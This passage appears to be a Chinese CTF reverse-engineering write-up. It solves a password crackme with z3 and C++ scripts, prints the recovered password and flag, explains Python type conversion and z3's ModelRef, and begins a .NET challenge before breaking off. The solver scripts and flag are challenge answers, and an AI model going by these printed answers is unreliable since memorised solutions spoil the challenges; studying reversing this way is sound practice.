<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">dword0=Int(<span class="string">&#x27;dword0&#x27;</span>)</span><br><span class="line">dword1=Int(<span class="string">&#x27;dword1&#x27;</span>)</span><br><span class="line">dword2=Int(<span class="string">&#x27;dword2&#x27;</span>)</span><br><span class="line">dword3=Int(<span class="string">&#x27;dword3&#x27;</span>)</span><br><span class="line">solve(</span><br><span class="line">    dword0*dword1-dword2*dword3==<span class="number">0x24CDF2E7C953DA56</span>,</span><br><span class="line">    (<span class="number">3</span>*dword2+<span class="number">4</span>*dword3)-(<span class="number">1</span>*dword1+<span class="number">2</span>*dword0)==<span class="number">0x17B85F06</span>,</span><br><span class="line">    <span class="number">3</span>*dword0*dword3-dword2*dword1==<span class="number">0x2E6E497E6415CF3E</span>,</span><br><span class="line">    (<span class="number">27</span>*dword1+dword0)-(<span class="number">11</span>*dword3+dword2)==<span class="number">0x95AE13337</span>,</span><br><span class="line">)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>运行结果</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\<span class="number">86135</span>\Desktop\reverse&gt; python exp.py</span><br><span class="line">[dword3 = <span class="number">862734414</span>,</span><br><span class="line"> dword1 = <span class="number">1801073242</span>,</span><br><span class="line"> dword2 = <span class="number">829124174</span>,</span><br><span class="line"> dword0 = <span class="number">1869639009</span>]</span><br></pre></td></tr></table></figure>
<p>下面解出v5~v12的随机数值</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="type">int</span> dword3 = <span class="number">862734414</span>;</span><br><span class="line"><span class="type">int</span> dword1 = <span class="number">1801073242</span>;</span><br><span class="line"><span class="type">int</span> dword2 = <span class="number">829124174</span>;</span><br><span class="line"><span class="type">int</span> dword0 = <span class="number">1869639009</span>;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">srand</span>(dword1 ^ dword2 ^ dword3 ^ dword0);</span><br><span class="line">    <span class="type">int</span> v5 = <span class="built_in">rand</span>() % <span class="number">50</span>;</span><br><span class="line">    <span class="type">int</span> v6 = <span class="built_in">rand</span>() % <span class="number">50</span>;</span><br><span class="line">    <span class="type">int</span> v7 = <span class="built_in">rand</span>() % <span class="number">50</span>;</span><br><span class="line">    <span class="type">int</span> v8 = <span class="built_in">rand</span>() % <span class="number">50</span>;</span><br><span class="line">    <span class="type">int</span> v9 = <span class="built_in">rand</span>() % <span class="number">50</span>;</span><br><span class="line">    <span class="type">int</span> v10 = <span class="built_in">rand</span>() % <span class="number">50</span>;</span><br><span class="line">    <span class="type">int</span> v11 = <span class="built_in">rand</span>() % <span class="number">50</span>;</span><br><span class="line">    <span class="type">int</span> v12 = <span class="built_in">rand</span>() % <span class="number">50</span>;</span><br><span class="line">    cout&lt;&lt;v5&lt;&lt;endl&lt;&lt;v6&lt;&lt;endl&lt;&lt;v7&lt;&lt;endl&lt;&lt;v8&lt;&lt;endl&lt;&lt;v9&lt;&lt;endl&lt;&lt;v10&lt;&lt;endl&lt;&lt;v11&lt;&lt;endl&lt;&lt;v12&lt;&lt;endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿Executor)-[/mnt/c/Users/86135/Desktop/reverse]</span><br><span class="line">└─# g++ main.cpp -O0 -o main -m32</span><br><span class="line"></span><br><span class="line">┌──(root㉿Executor)-[/mnt/c/Users/86135/Desktop/reverse]</span><br><span class="line">└─# ./main</span><br><span class="line">22</span><br><span class="line">39</span><br><span class="line">45</span><br><span class="line">45</span><br><span class="line">35</span><br><span class="line">41</span><br><span class="line">13</span><br><span class="line">36</span><br></pre></td></tr></table></figure>
<p>下面又有四个约束条件</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">v4 * v6 + v1 * v5 - v2 - v3 == 0xE638C96D3LL</span><br><span class="line">v4 + v1 + v3 * v8 - v2 * v7 == 0xB59F2D0CBLL</span><br><span class="line">v1 * v9 + v2 * v10 - v3 - v4 == 0xDCFE88C6DLL</span><br><span class="line">v3 * v12 + v1 - v2 - v4 * v11 == 0xC076D98BBLL </span><br></pre></td></tr></table></figure>
<p>目标是解出v1~v4,对应输入的后四个双字</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line">v5=<span class="number">22</span></span><br><span class="line">v6=<span class="number">39</span></span><br><span class="line">v7=<span class="number">45</span></span><br><span class="line">v8=<span class="number">45</span></span><br><span class="line">v9=<span class="number">35</span></span><br><span class="line">v10=<span class="number">41</span></span><br><span class="line">v11=<span class="number">13</span></span><br><span class="line">v12=<span class="number">36</span></span><br><span class="line">v1=Int(<span class="string">&#x27;v1&#x27;</span>)</span><br><span class="line">v2=Int(<span class="string">&#x27;v2&#x27;</span>)</span><br><span class="line">v3=Int(<span class="string">&#x27;v3&#x27;</span>)</span><br><span class="line">v4=Int(<span class="string">&#x27;v4&#x27;</span>)</span><br><span class="line">solve(</span><br><span class="line">    v4 * v6 + v1 * v5 - v2 - v3 == <span class="number">0xE638C96D3</span>,</span><br><span class="line">    v4 + v1 + v3 * v8 - v2 * v7 == <span class="number">0xB59F2D0CB</span>,</span><br><span class="line">    v1 * v9 + v2 * v10 - v3 - v4 == <span class="number">0xDCFE88C6D</span>,</span><br><span class="line">    v3 * v12 + v1 - v2 - v4 * v11 == <span class="number">0xC076D98BB</span>,</span><br><span class="line">)</span><br></pre></td></tr></table></figure>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\<span class="number">86135</span>\Desktop\reverse&gt; python exp2.py</span><br><span class="line">[v1 = <span class="number">811816014</span>,</span><br><span class="line"> v4 = <span class="number">1195788129</span>,</span><br><span class="line"> v2 = <span class="number">828593230</span>,</span><br><span class="line"> v3 = <span class="number">1867395930</span>]</span><br></pre></td></tr></table></figure>
<p>到此输入全部被解出了,将其转换为字符串</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line">using namespace <span class="built_in">std</span>;</span><br><span class="line"><span class="type">int</span> dwords[<span class="number">8</span>] = &#123;</span><br><span class="line">    <span class="number">1869639009</span>,</span><br><span class="line">    <span class="number">1801073242</span>,</span><br><span class="line">    <span class="number">829124174</span>,</span><br><span class="line">    <span class="number">862734414</span>,</span><br><span class="line">    <span class="number">811816014</span>,</span><br><span class="line">    <span class="number">828593230</span>,</span><br><span class="line">    <span class="number">1867395930</span>,</span><br><span class="line">    <span class="number">1195788129</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Bitfield</span>&#123;</span></span><br><span class="line">    <span class="type">char</span> bytes[<span class="number">4</span>];</span><br><span class="line">    <span class="type">int</span> aInt;</span><br><span class="line">    Bitfield(<span class="type">const</span> <span class="type">int</span> &amp;x)&#123;</span><br><span class="line">        bytes[<span class="number">0</span>]=(<span class="type">unsigned</span> <span class="type">char</span> )x;</span><br><span class="line">        bytes[<span class="number">1</span>]=(<span class="type">unsigned</span> <span class="type">char</span>)(x&gt;&gt;<span class="number">8</span>);</span><br><span class="line">        bytes[<span class="number">2</span>]=(<span class="type">unsigned</span> <span class="type">char</span>)(x&gt;&gt;<span class="number">16</span>);</span><br><span class="line">        bytes[<span class="number">3</span>]=(<span class="type">unsigned</span> <span class="type">char</span>)(x&gt;&gt;<span class="number">24</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    friend ostream &amp;operator&lt;&lt;(ostream &amp;os,<span class="type">const</span> Bitfield &amp;bf)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">4</span>;++i)&#123;</span><br><span class="line">            os&lt;&lt;bf.bytes[i];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> os;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">8</span>;++i)&#123;</span><br><span class="line">        Bitfield <span class="title function_">bf</span><span class="params">(dwords[i])</span>;</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;bf;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\86135\Desktop\reverse&gt; g++ main2.cpp -O0 -o main2</span><br><span class="line">PS C:\Users\86135\Desktop\reverse&gt; ./main2</span><br><span class="line">ampoZ2ZkNnk1NHl3NTc0NTc1Z3NoaGFG</span><br></pre></td></tr></table></figure>
<p>然后输入到程序就可以得到flag</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿Executor)-[/mnt/c/Users/86135/Desktop/reverse]</span><br><span class="line">└─# ./mathbad</span><br><span class="line">=======================================</span><br><span class="line">= Welcome to the flag access machine! =</span><br><span class="line">=   Input the password to login ...   =</span><br><span class="line">=======================================</span><br><span class="line">ampoZ2ZkNnk1NHl3NTc0NTc1Z3NoaGFG</span><br><span class="line">Congratulations! You should get the flag...</span><br><span class="line">flag&#123;th3_Line@r_4lgebra_1s_d1fficult!&#125;</span><br></pre></td></tr></table></figure>
<h4 id="回到本题">回到本题</h4>
<p>要使用z3模块解体,首先需要注册变量,比如<code>x=Int("x")</code>这种</p>
<p>而现在22个变量如果手动更换成x,y,z这种字母,太浪费时间,太死脑筋</p>
<p>师傅直接用循环注册了一个flag变量数组</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">flag = [Int(<span class="string">&quot;input[%d]&quot;</span>%i) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">22</span>)]</span><br><span class="line">s = Solver()</span><br></pre></td></tr></table></figure>
<p>然后怎么添加约束条件呢?利用这个and,再每个等式前面和后面都加上点东西</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">s.add(等式)</span><br></pre></td></tr></table></figure>
<p>就要这种光标排山倒海的效果</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20221110163329271.png"
alt="image-20221110163329271" />
<figcaption aria-hidden="true">image-20221110163329271</figcaption>
</figure>
<p>把原来有的ord函数也去掉</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line">flag=[Int(<span class="string">&quot;flag[%d]&quot;</span>%i)<span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">22</span>)]</span><br><span class="line">s=Solver()</span><br><span class="line">s.add((flag[<span class="number">0</span>]) * <span class="number">7072</span> + (flag[<span class="number">1</span>]) * <span class="number">2523</span> + (flag[<span class="number">2</span>]) * <span class="number">6714</span> + (flag[<span class="number">3</span>]) * <span class="number">8810</span> + (flag[<span class="number">4</span>]) * <span class="number">6796</span> + (flag[<span class="number">5</span>]) * <span class="number">2647</span> + (flag[<span class="number">6</span>]) * <span class="number">1347</span> + (flag[<span class="number">7</span>]) * <span class="number">1289</span> + (flag[<span class="number">8</span>]) * <span class="number">8917</span> + (flag[<span class="number">9</span>]) * <span class="number">2304</span> + (flag[<span class="number">10</span>]) * <span class="number">5001</span> + (flag[<span class="number">11</span>]) * <span class="number">2882</span> + (flag[<span class="number">12</span>]) * <span class="number">7232</span> + (flag[<span class="number">13</span>]) * <span class="number">3192</span> + (flag[<span class="number">14</span>]) * <span class="number">9676</span> + (flag[<span class="number">15</span>]) * <span class="number">5436</span> + (flag[<span class="number">16</span>]) * <span class="number">4407</span> + (flag[<span class="number">17</span>]) * <span class="number">6269</span> + (flag[<span class="number">18</span>]) * <span class="number">9623</span> + (flag[<span class="number">19</span>]) * <span class="number">6230</span> + (flag[<span class="number">20</span>]) * <span class="number">6292</span> + (flag[<span class="number">21</span>]) * <span class="number">57</span> == <span class="number">10743134</span>)</span><br><span class="line">...</span><br><span class="line">s.add((flag[<span class="number">0</span>]) * <span class="number">5926</span> + (flag[<span class="number">1</span>]) * <span class="number">9095</span> + (flag[<span class="number">2</span>]) * <span class="number">2048</span> + (flag[<span class="number">3</span>]) * <span class="number">4639</span> + (flag[<span class="number">4</span>]) * <span class="number">3035</span> + (flag[<span class="number">5</span>]) * <span class="number">9560</span> + (flag[<span class="number">6</span>]) * <span class="number">1591</span> + (flag[<span class="number">7</span>]) * <span class="number">2392</span> + (flag[<span class="number">8</span>]) * <span class="number">1812</span> + (flag[<span class="number">9</span>]) * <span class="number">6732</span> + (flag[<span class="number">10</span>]) * <span class="number">9454</span> + (flag[<span class="number">11</span>]) * <span class="number">8175</span> + (flag[<span class="number">12</span>]) * <span class="number">7346</span> + (flag[<span class="number">13</span>]) * <span class="number">6333</span> + (flag[<span class="number">14</span>]) * <span class="number">9812</span> + (flag[<span class="number">15</span>]) * <span class="number">2034</span> + (flag[<span class="number">16</span>]) * <span class="number">6634</span> + (flag[<span class="number">17</span>]) * <span class="number">1762</span> + (flag[<span class="number">18</span>]) * <span class="number">7058</span> + (flag[<span class="number">19</span>]) * <span class="number">3524</span> + (flag[<span class="number">20</span>]) * <span class="number">7462</span> + (flag[<span class="number">21</span>]) * <span class="number">11</span> == <span class="number">11118093</span>)</span><br><span class="line"><span class="keyword">if</span>(s.check()==sat):</span><br><span class="line">    result = s.model()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span> (<span class="number">22</span>):</span><br><span class="line">        <span class="built_in">print</span>(result[flag[i]])</span><br></pre></td></tr></table></figure>
<p>这样写完之后,最终打印的是<code>result[flag[i]]</code>,不是<code>result[i]</code>,这是因为一开始是将flag[0]注册为第一个变量,flag[1]注册为第二个变量</p>
<p>这样打印出来的是字符的ascii值,怎么才能打印出字符呢?</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="built_in">chr</span>(<span class="built_in">int</span>(<span class="built_in">str</span>(m[flag[i]]))),end = <span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p>为了搞明白为啥需要这么多类型转换,总结一下python中int,byte,char,str之间的转换函数</p>
<h4 id="python中的类型转换">python中的类型转换</h4>
<table>
<colgroup>
<col style="width: 30%" />
<col style="width: 69%" />
</colgroup>
<thead>
<tr>
<th>函数</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>int(x [,base ])</td>
<td>将字符串x转换为⼀个整数</td>
</tr>
<tr>
<td>float(x )</td>
<td>将字符串x转换为⼀个浮点数</td>
</tr>
<tr>
<td>complex(real [,imag ])</td>
<td>创建⼀个复数，real为实部，imag为虚部</td>
</tr>
<tr>
<td>str(x )</td>
<td>将对象 x 转换为字符串</td>
</tr>
<tr>
<td>repr(x )</td>
<td>将对象 x 转换为表达式字符串</td>
</tr>
<tr>
<td>eval(str )</td>
<td>⽤来计算在字符串中的有效Python表达式,并返回⼀个对象</td>
</tr>
<tr>
<td>tuple(s )</td>
<td>将序列 s 转换为⼀个元组</td>
</tr>
<tr>
<td>list(s )</td>
<td>将序列 s 转换为⼀个列表</td>
</tr>
<tr>
<td>chr(x )</td>
<td>将⼀个整数转换为⼀个Unicode字符</td>
</tr>
<tr>
<td>ord(x )</td>
<td>将⼀个字符转换为它的ASCII整数值</td>
</tr>
<tr>
<td>hex(x )</td>
<td>将⼀个整数转换为⼀个⼗六进制<strong>字符串</strong></td>
</tr>
<tr>
<td>oct(x )</td>
<td>将⼀个整数转换为⼀个⼋进制字符串</td>
</tr>
<tr>
<td>bin(x )</td>
<td>将⼀个整数转换为⼀个⼆进制字符串</td>
</tr>
</tbody>
</table>
<p>对于<code>int(str,[,base])</code>,base通过一个整数值指定将str理解为10进制或者16进制的字面量进行转换</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">int</span>(<span class="string">&quot;10&quot;</span>,<span class="number">10</span>)</span><br><span class="line"><span class="number">10</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">int</span>(<span class="string">&quot;0x10&quot;</span>,<span class="number">10</span>)</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">&quot;&lt;stdin&gt;&quot;</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">ValueError: invalid literal <span class="keyword">for</span> <span class="built_in">int</span>() <span class="keyword">with</span> base <span class="number">10</span>: <span class="string">&#x27;0x10&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">int</span>(<span class="string">&quot;0x10&quot;</span>,<span class="number">16</span>)</span><br><span class="line"><span class="number">16</span></span><br></pre></td></tr></table></figure>
<p>如果str="0x10"带了0x前缀,此时base=16可以将str转换为16进制整数,但是尝试转换为10进制就会出错</p>
<p>但是如果str="0x10"则既可以识别为10进制,也可以识别为16进制</p>
<p>回过头来理解<code>print(chr(int(str(m[flag[i]]))),end = '')</code></p>
<p>这样写首先将一个整数转为str然后又转为int,看似是转了个寂寞,其实一个函数也不能少</p>
<p>chr接收一个int,但是<code>m[flag[i]]</code>实际上是Solver.model()的返回值,是一个modelRef引用.为啥不是整数?因为Solver还可以求解浮点数方程组.因此需要对modelRef不能直接丢给chr</p>
<p>并且modelRef也没有直接丢给int函数,这是因为int函数只接受str作为参数,modelRef没有像str的自动类型转换,因此首先需要调用一个str函数将modelRef转为字符串类型</p>
<p>为啥str函数可以接收这个不是python自己的,而是来自其他模块的类型modelRef?</p>
<p>因为str的参数可以是任何obj对象,显然modelRef是一个对象,可以被str通吃</p>
<h4 id="str干了啥">str干了啥?</h4>
<p>str函数会调用该类的<code>__str__</code>函数,如果没有显式定义这个函数,则隐式的<code>__str__</code>函数会将对象的地址信息转换成字符串返回给str函数,然后str再将这个值返回给用户,比如</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;__main__.A <span class="built_in">object</span> at <span class="number">0x0000026784BF8730</span>&gt;</span><br></pre></td></tr></table></figure>
<p>如果有显式实现<code>__str__</code>函数,则str会获得该函数的返回值,比如</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">A</span>:</span><br><span class="line">    a=<span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">x</span>):</span><br><span class="line">        a=x</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__str__</span>(<span class="params">self</span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;123&quot;</span></span><br><span class="line">a=A()</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">str</span>(a))</span><br></pre></td></tr></table></figure>
<p>这样运行结果就是<code>123</code></p>
<p>如果还重载了<code>__repr__</code>函数,则str函数首先调用显式的<code>__repr__</code>函数获得返回值</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">A</span>:</span><br><span class="line">    a=<span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">x</span>):</span><br><span class="line">        a=x</span><br><span class="line">        <span class="comment"># pass</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__repr__</span>(<span class="params">self</span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;123&quot;</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__str__</span>(<span class="params">self</span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;456&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">a=A()</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">str</span>(a))</span><br></pre></td></tr></table></figure>
<p>运行结果:<code>456</code></p>
<p>因此可以估计,Solver.model()函数返回的东西,要么重载了<code>__str__</code>函数,要么重载了<code>__repr__</code>函数</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">model</span>(<span class="params">self</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">return</span> ModelRef(Z3_solver_get_model(<span class="variable language_">self</span>.ctx.ref(), <span class="variable language_">self</span>.solver), <span class="variable language_">self</span>.ctx)</span><br><span class="line">    <span class="keyword">except</span> Z3Exception:</span><br><span class="line">        <span class="keyword">raise</span> Z3Exception(<span class="string">&quot;model is not available&quot;</span>)</span><br></pre></td></tr></table></figure>
<p>如果程序没有问题则返回了一个ModelRef类型的对象</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">ModelRef</span>(<span class="title class_ inherited__">Z3PPObject</span>):</span><br><span class="line">	...</span><br><span class="line">	   <span class="keyword">def</span> <span class="title function_">__repr__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> obj_to_string(<span class="variable language_">self</span>)</span><br><span class="line">	...</span><br></pre></td></tr></table></figure>
<p>这里调用了一个obj_to_string函数,这个函数也是z3模块提供的</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">obj_to_string</span>(<span class="params">a</span>):</span><br><span class="line">    out = io.StringIO()<span class="comment">#都是python自带类型,创建一个字符串流对象</span></span><br><span class="line">    _PP(out, _Formatter(a))<span class="comment">#z3模块函数,将z3模块对象a按照其实际类型转换后放到out流上</span></span><br><span class="line">    <span class="keyword">return</span> out.getvalue()<span class="comment">#getvalue取得字符串流上的字符串,返回</span></span><br></pre></td></tr></table></figure>
<p>这里z3模块函数Formatter会根据z3对象a的实际类型,决定返回什么样的字符串</p>
<h3 id="d_flat">D_flat</h3>
<p>给了好多个文件</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Mode                 LastWriteTime         Length Name</span><br><span class="line">----                 -------------         ------ ----</span><br><span class="line">-a----         2022/7/19     18:10            410 D_flat.deps.json</span><br><span class="line">-a----         2022/7/19     18:11           5632 D_flat.dll</span><br><span class="line">-a----         2022/7/19     18:11         149504 D_flat.exe</span><br><span class="line">-a----         2022/7/19     18:11          10384 D_flat.pdb</span><br><span class="line">-a----         2022/7/19     18:10            253 D_flat.runtimeconfig.json</span><br></pre></td></tr></table></figure>
<p>我认识的有</p>
<p>dll,动态链接库</p>
<p>exe,主程序,入口点</p>
<p>pdb,符号文件,ida调试时可以载入</p>
<p>我认识json是字符串存储的js对象,但是不知道这里两个json文件可以干啥</p>
<p>用exeinfope查dll文件的壳发现是C#编写的,</p>
<p>用ida64打开D_flat.exe之后就傻眼了,看不到一点flag的痕迹,感觉都是什么.NET平台还有C#那一套东西的环境初始化</p>
<p>师傅说用dnspy反汇编D_flat.dll,刚用dnspy蒙蔽的很,但是转到入口点五个字我还是认得的</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20221110180846574.png"
alt="image-20221110180846574" />
<figcaption aria-hidden="true">image-20221110180846574</figcaption>
</figure>
<figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span 